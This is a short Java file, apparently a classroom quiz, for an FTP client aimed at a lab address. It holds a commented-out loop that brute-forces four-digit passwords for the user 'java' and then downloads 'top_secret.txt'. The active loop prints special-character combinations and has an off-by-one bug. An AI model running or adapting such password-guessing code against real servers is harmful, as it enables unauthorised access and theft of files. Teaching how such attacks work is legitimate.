import it.sauronsoftware.ftp4j.FTPClient;
import java.io.File;

public class Quiz02 {
	public static void main(String[] args) throws Exception {
				
		char[] keys = "!@#$%^&(".toCharArray();
		FTPClient client = new FTPClient();
		client.setCharset("euckr");
		
		client.connect("192.168.0.161");
		
		
		for(int i = 0;i <= keys.length;i++) {
			for(int j = 0;j < keys.length;j++) {
				for(int k = 0;k < keys.length;k++) {
					System.out.println(keys[i] + " " + keys[j] + " " + keys[k]);
				}
			}
			
		}
		
		
		
		
		
//		client.connect("192.168.0.161");
//		
//		
//		for(int i = 1000;i <= 9999;i++) {
//			try {
//				client.login("java", String.valueOf(i));  // 숫자를 문자열로 프로모션
//				break;
//			}catch(Exception e) {
//				System.out.println("로그인 실패 : " + i);
//			}
//			
//		}
		
		client.download("top_secret.txt", new File("c:/workspace/downloads/abcd.txt"));
		
		client.disconnect(true);
		
	}
}
